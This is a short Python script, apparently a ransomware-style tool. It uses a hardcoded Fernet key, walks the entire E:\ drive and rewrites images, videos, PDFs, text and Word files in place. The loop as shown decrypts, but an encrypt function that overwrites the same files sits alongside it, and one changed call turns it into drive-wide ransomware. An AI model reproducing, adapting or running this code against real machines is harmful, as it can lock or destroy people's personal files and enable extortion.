import os
from cryptography import fernet
from cryptography.fernet import Fernet
from binascii import Error
APP_FOLDER = 'E:\\'

totalFiles = 0
totalDir = 0
k="bImD4glbqcfVl7EyyTVJxqc6N_bdu6UR_yDte2tqerU="
def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

for base, dirs, files in os.walk(APP_FOLDER):
    print('Searching in : ',base)
    for directories in dirs:
        totalDir += 1
    for Files in files:
        totalFiles += 1
        if Files.endswith(('.png','.jpg','.txt','.mp4','.jpeg','.pdf','.docx')):
            try:
                os.chdir(base)
                decrypt(os.path.abspath(Files),k)
            except(fernet.InvalidToken, TypeError, Error):
                print("Skipping IT")
            


print('Total number of files',totalFiles)
print('Total Number of directories',totalDir)
print('Total:',(totalDir + totalFiles))